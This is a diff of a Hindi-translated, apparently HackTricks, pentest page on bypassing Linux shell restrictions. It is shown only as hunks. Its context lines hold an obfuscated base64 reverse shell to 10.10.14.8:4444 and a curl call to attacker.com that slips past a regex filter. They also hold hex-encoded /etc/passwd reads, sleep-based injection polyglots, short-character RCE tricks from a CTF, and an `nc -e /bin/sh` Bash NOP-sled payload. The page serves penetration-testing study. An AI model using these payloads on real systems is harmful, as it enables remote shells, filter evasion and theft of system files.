@@ -1,8 +1,8 @@
-# Linux Restrictions को Bypass करना
+# Linux प्रतिबंधों को बायपास करना
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## सामान्य सीमाओं को Bypass करने के तरीके
+## सामान्य सीमाओं के बायपास
 
 ### Reverse Shell
 ```bash
@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### छोटा Rev shell
+### संक्षिप्त Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass Paths और निषिद्ध शब्द
+### Bypass Paths और प्रतिबंधित शब्द
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -124,7 +124,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### IPs को Bypass करना
+### IPs को बायपास करना
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -133,18 +133,18 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Env Variables से अक्षर प्राप्त करना
+### Env Variables से characters प्राप्त करना
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
 ### DNS data exfiltration
 
-उदाहरण के लिए आप **burpcollab** या [**pingb**](http://pingb.in) का उपयोग कर सकते हैं।
+उदाहरण के लिए, आप **burpcollab** या [**pingb**](http://pingb.in) का उपयोग कर सकते हैं।
 
 ### Builtins
 
-यदि आप external functions execute नहीं कर सकते और **RCE प्राप्त करने के लिए सीमित builtins** तक ही पहुंच है, तो ऐसा करने के लिए कुछ उपयोगी tricks हैं। आमतौर पर आप **सभी builtins** का उपयोग **नहीं कर पाएंगे**, इसलिए jail को bypass करने के लिए आपके पास मौजूद सभी विकल्पों की जानकारी होनी चाहिए। यह विचार [**devploit**](https://twitter.com/devploit) से लिया गया है।\
+यदि आप external functions को execute नहीं कर सकते और आपके पास **RCE प्राप्त करने के लिए limited set of builtins** का ही access है, तो ऐसा करने के लिए कुछ उपयोगी tricks हैं। आमतौर पर आप सभी **builtins** का उपयोग **नहीं कर पाएंगे**, इसलिए jail को bypass करने के लिए आपको अपने **सभी options** की जानकारी होनी चाहिए। यह विचार [**devploit**](https://twitter.com/devploit) से लिया गया है।\
 सबसे पहले सभी [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** को check करें।** इसके बाद यहां कुछ **recommendations** दी गई हैं:
 ```bash
 # Get list of builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### संभावित regexes को Bypass करना
+### संभावित regexes को Bypass करें
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -212,7 +212,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### 5 chars के साथ RCE
+### 5 chars वाला RCE
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -259,7 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### RCE with 4 characters
+### RCE with 4 अक्षर
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -296,8 +296,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-यदि आप **read-only और noexec protections** वाले filesystem के अंदर हैं या distroless container में भी हैं, तब भी **arbitrary binaries, यहां तक कि shell भी execute करने** के तरीके मौजूद हैं!:
-
+यदि आप ऐसे filesystem के अंदर हैं जिसमें **read-only और noexec protections** लागू हैं या वह distroless container भी है, तब भी **arbitrary binaries, यहाँ तक कि shell भी, execute करने के तरीके मौजूद हैं!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -305,38 +304,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Chroot & other Jails Bypass
 
-
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-जब कोई vulnerability आपको ऐसे argument को आंशिक रूप से control करने देती है जो अंततः `system()` या किसी अन्य shell तक पहुंचता है, तो आपको वह सटीक offset पता नहीं हो सकता जिस पर execution आपके payload को पढ़ना शुरू करता है। Traditional NOP sleds (जैसे `\x90`) shell syntax में **काम नहीं करते**, लेकिन Bash किसी command को execute करने से पहले शुरुआत के whitespace को सुरक्षित रूप से ignore कर देगा।
+जब कोई vulnerability आपको ऐसे argument को आंशिक रूप से control करने देती है जो अंततः `system()` या किसी अन्य shell तक पहुँचता है, तो आपको उस exact offset का पता नहीं हो सकता जहाँ execution आपके payload को पढ़ना शुरू करता है। Traditional NOP sleds (जैसे `\x90`) shell syntax में **काम नहीं करते**, लेकिन Bash command execute करने से पहले शुरुआत में मौजूद whitespace को बिना किसी नुकसान के ignore कर देगा।
 
-इसलिए आप अपने real command के आगे spaces या tab characters की लंबी sequence लगाकर *Bash के लिए NOP sled* बना सकते हैं:
+इसलिए आप अपने वास्तविक command के आगे spaces या tab characters की लंबी sequence जोड़कर *Bash के लिए NOP sled* बना सकते हैं:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-यदि कोई ROP chain (या कोई भी memory-corruption primitive) instruction pointer को space block के भीतर कहीं भी ले जाती है, तो Bash parser whitespace को आसानी से छोड़ देता है और `nc` तक पहुँचकर आपके command को विश्वसनीय रूप से execute करता है।
+यदि कोई ROP chain (या कोई memory-corruption primitive) instruction pointer को space block के भीतर कहीं भी पहुंचा देती है, तो Bash parser whitespace को तब तक आसानी से छोड़ देता है जब तक वह `nc` तक नहीं पहुंच जाता और आपके command को विश्वसनीय रूप से execute करता है।
 
-व्यावहारिक उपयोग के मामले:
+Practical use cases:
 
-1. **Memory-mapped configuration blobs** (जैसे NVRAM), जो विभिन्न processes के बीच accessible हों।
-2. ऐसी स्थितियाँ जहाँ attacker payload को align करने के लिए NULL bytes नहीं लिख सकता।
-3. Embedded devices, जहाँ केवल BusyBox `ash`/`sh` उपलब्ध हो – वे भी शुरुआती spaces को ignore करते हैं।
+1. **Memory-mapped configuration blobs** (जैसे NVRAM), जो अलग-अलग processes के बीच accessible हों।
+2. ऐसी स्थितियां जहां attacker payload को align करने के लिए NULL bytes नहीं लिख सकता।
+3. Embedded devices जहां केवल BusyBox `ash`/`sh` उपलब्ध हो - वे भी शुरुआती spaces को ignore करते हैं।
 
-> 🛠️  इस trick को `system()` call करने वाले ROP gadgets के साथ combine करें, ताकि memory-constrained IoT routers पर exploit reliability को बहुत बढ़ाया जा सके।
+> 🛠️  इस trick को `system()` call करने वाले ROP gadgets के साथ combine करने पर memory-constrained IoT routers पर exploit की reliability बहुत बढ़ जाती है।
 
-## References और अधिक
+## संदर्भ
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [छोड़े गए hardware में zero days का exploitation – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
